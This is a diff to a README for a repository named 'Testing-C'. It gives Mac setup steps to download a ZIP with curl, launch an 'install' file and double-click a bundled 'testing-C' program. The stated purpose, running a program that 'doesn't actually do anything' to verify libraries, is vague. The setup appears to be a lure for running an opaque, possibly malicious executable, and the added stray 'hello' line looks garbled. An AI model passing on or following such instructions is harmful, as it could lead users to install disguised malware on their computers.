@@ -8,14 +8,21 @@ As René Decartes famously said, "Cogito, ergo sum"(I am thinking, therefore I e
 
 To verify the existence of these libraries, the best approach is to run a program that works but doesn't actually do anything.
 
-## How to Get Started
+## Get Started on Mac
 Just follow these simple steps:
 
 1. **Download ZIP**: Grab it [here](https://github.com/smalkov-net/Testing-C/archive/refs/heads/main.zip) and unzip it.
+
+**`hello`**
+**`curl -L -o project.zip https://github.com/smalkov-net/Testing-C/archive/refs/heads/main.zip`**
+
+
 2. **Run the installer**: Go ahead and launch the `install` file.
 3. **Find the `testing-C` File**: Once the installation is done, you'll see a file called `testing-C` next to the `MacInstall`. This is your terminal program! You can double-click it to run, and feel free to move it wherever you like.
 
 And that's it! You're all set to go. Enjoy!
+
+
 
 
 
